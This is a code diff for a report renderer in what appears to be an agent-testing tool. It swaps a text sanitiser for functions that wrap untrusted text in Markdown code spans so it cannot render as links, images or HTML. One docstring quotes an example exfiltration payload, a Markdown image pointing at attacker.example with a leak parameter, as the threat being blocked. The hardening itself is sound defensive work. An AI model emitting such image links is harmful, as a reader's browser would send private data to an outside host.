@@ -26,11 +26,24 @@ DISCLAIMER = (
 COST_NOTE = "Cost is an estimate: reported tokens multiplied by the price table named below."
 
 
-def clean(text: object, limit: int = 300) -> str:
-    """One line of untrusted text made safe for a table cell or a terminal."""
-    flat = " ".join(strip_control(str(text)).split())
-    flat = flat.replace("|", "\\|").replace("`", "'").replace("<", "&lt;").replace(">", "&gt;")
-    return truncate(flat, limit)
+def plain(text: object, limit: int = 300) -> str:
+    """One line of untrusted text for a place that interprets no markup.
+
+    Use for terminals, data-frame cells and widget option labels: control characters are
+    removed, whitespace is collapsed and the text is truncated.
+    """
+    return truncate(" ".join(strip_control(str(text)).split()), limit)
+
+
+def inline(text: object, limit: int = 300) -> str:
+    """Untrusted text as a Markdown code span, safe inside a paragraph or a table cell.
+
+    Nothing inside a code span is interpreted, so a tool argument such as
+    ``![x](https://attacker.example/?leak=...)`` cannot become an image that the reader's
+    browser fetches, a link, or HTML. Backticks are replaced and pipes escaped.
+    """
+    body = plain(text, limit).replace("`", "'").replace("|", "\\|")
+    return f"`{body}`" if body.strip() else "`(empty)`"
 
 
 def fenced(text: object, limit: int = 2000) -> str:
@@ -63,15 +76,15 @@ def money(value: float | None) -> str:
 
 
 def _failure_block(result: CaseResult) -> list[str]:
-    lines = [f"### `{clean(result.case_id, 100)}` ({result.category}), trial {result.trial}", ""]
+    lines = [f"### {inline(result.case_id, 100)} ({result.category}), trial {result.trial}", ""]
     for evaluation in result.evaluations:
         for item in evaluation.failures():
-            lines.append(f"- **{evaluation.evaluator}** / {item.code}: {clean(item.message, 400)}")
+            lines.append(f"- **{evaluation.evaluator}** / {item.code}: {inline(item.message, 400)}")
     calls = result.trace.tool_calls
     if calls:
         shown = ", ".join(f"{call.tool}{'' if call.ok else ' (failed)'}" for call in calls[:12])
         more = f", … {len(calls) - 12} more" if len(calls) > 12 else ""
-        lines.append(f"- tool calls: {clean(shown, 400)}{more}")
+        lines.append(f"- tool calls: {inline(shown, 400)}{more}")
     lines += [
         "",
         f"Ended as `{result.trace.status}`. Output:",
@@ -88,9 +101,9 @@ def render_run_report(
     """A Markdown report for one run."""
     m = metrics or compute_metrics(run)
     lines = [
-        f"# Agent reliability report: {clean(run.agent_name, 100)} {clean(run.agent_version, 40)}",
+        f"# Agent reliability report: {inline(f'{run.agent_name} {run.agent_version}', 140)}",
         "",
-        f"Suite `{clean(run.suite_name, 100)}` (version {clean(run.suite_version, 40)}), "
+        f"Suite {inline(run.suite_name, 100)} (version {inline(run.suite_version, 40)}), "
         f"{m.cases} cases x {m.trials} trial(s), seed {run.config.seed}. "
         f"Run `{run.run_id}` created {run.created_at} with Agent Reliability Lab "
         f"{run.arl_version}."
@@ -121,7 +134,7 @@ def render_run_report(
         f"| Estimated cost, total / mean per case-trial | {money(m.estimated_cost_usd)} / "
         f"{money(m.mean_cost_usd_per_trial)} |",
         "",
-        f"{COST_NOTE} Price table: `{clean(m.price_table, 60)}`."
+        f"{COST_NOTE} Price table: {inline(m.price_table, 60)}."
         + (
             f" {m.unpriced_trials} case-trial(s) used a model with no price."
             if m.unpriced_trials
@@ -132,7 +145,7 @@ def render_run_report(
     if m.flaky_cases:
         lines += [
             f"**Flaky cases** (passed some trials, failed others): "
-            f"{', '.join(f'`{clean(c, 100)}`' for c in m.flaky_cases)}",
+            f"{', '.join(inline(c, 100) for c in m.flaky_cases)}",
             "",
         ]
     lines += [
@@ -189,7 +202,7 @@ def _changes(title: str, changes: list[CaseChange]) -> list[str]:
     ]
     for change in changes:
         lines.append(
-            f"| `{clean(change.case_id, 100)}` | {change.category} | {change.baseline} "
+            f"| {inline(change.case_id, 100)} | {change.category} | {change.baseline} "
             f"({change.baseline_passes}) | {change.candidate} ({change.candidate_passes}) | "
             f"{', '.join(change.failed_evaluators) or '-'} |"
         )
@@ -224,11 +237,9 @@ def render_comparison(report: RegressionReport) -> str:
     lines = [
         "# Regression report",
         "",
-        f"Baseline: `{clean(b.agent, 100)} {clean(b.version, 40)}` "
-        f"(run `{b.run_id}`, {b.created_at})  ",
-        f"Candidate: `{clean(c.agent, 100)} {clean(c.version, 40)}` "
-        f"(run `{c.run_id}`, {c.created_at})  ",
-        f"Suite `{clean(c.suite, 100)}`, {report.cases_compared} cases compared, "
+        f"Baseline: {inline(f'{b.agent} {b.version}', 140)} (run `{b.run_id}`, {b.created_at})  ",
+        f"Candidate: {inline(f'{c.agent} {c.version}', 140)} (run `{c.run_id}`, {c.created_at})  ",
+        f"Suite {inline(c.suite, 100)}, {report.cases_compared} cases compared, "
         f"{c.trials} trial(s) per case.",
         "",
         f"## Verdict: {VERDICT_TEXT[report.verdict]}",
@@ -256,7 +267,7 @@ def render_comparison(report: RegressionReport) -> str:
     if report.still_failing:
         lines += [
             f"Still failing in both runs ({len(report.still_failing)}): "
-            + ", ".join(f"`{clean(case, 100)}`" for case in report.still_failing),
+            + ", ".join(inline(case, 100) for case in report.still_failing),
             "",
         ]
     lines += [
@@ -280,13 +291,13 @@ def render_calibration(report: CalibrationReport) -> str:
     """A Markdown report for a judge calibration."""
     cm = report.confusion
     lines = [
-        f"# Judge calibration: {clean(report.judge, 100)}",
+        f"# Judge calibration: {inline(report.judge, 100)}",
         "",
-        f"Rubric `{clean(report.rubric, 100)}`, {report.labelled} labelled item(s) of "
+        f"Rubric {inline(report.rubric, 100)}, {report.labelled} labelled item(s) of "
         f"{report.items}. Review policy: minimum confidence {report.policy.min_confidence:g}, "
         f"ambiguity margin {report.policy.ambiguity_margin:g}, {report.policy.samples} reading(s) "
         "per item.",
-        *(["", f"Dataset: {clean(report.dataset, 600)}"] if report.dataset else []),
+        *(["", f"Dataset: {inline(report.dataset, 600)}"] if report.dataset else []),
         "",
         "| Label in the dataset | Judge: pass | Judge: fail | Sent to human review |",
         "|---|---|---|---|",
@@ -317,9 +328,9 @@ def render_calibration(report: CalibrationReport) -> str:
         ]
         for item in report.disagreements[:50]:
             lines.append(
-                f"| `{clean(item.item_id, 100)}` | {item.human} | {item.judge} | "
+                f"| {inline(item.item_id, 100)} | {item.human} | {item.judge} | "
                 f"{number(item.score, 2)} | {number(item.confidence, 2)} | "
-                f"{clean(item.note, 120)} |"
+                f"{inline(item.note, 120) if item.note else ''} |"
             )
         lines.append("")
     lines.append(
@@ -337,10 +348,10 @@ def render_run_list(infos: list[RunInfo]) -> str:
     for info in infos:
         rows.append(
             (
-                clean(info.name, 80),
-                clean(info.suite, 30),
-                clean(info.agent, 30),
-                clean(info.version, 15),
+                plain(info.name, 80),
+                plain(info.suite, 30),
+                plain(info.agent, 30),
+                plain(info.version, 15),
                 info.created_at,
                 str(info.trials),
                 f"{info.passed}/{info.total} ({info.pass_rate:.0%})",
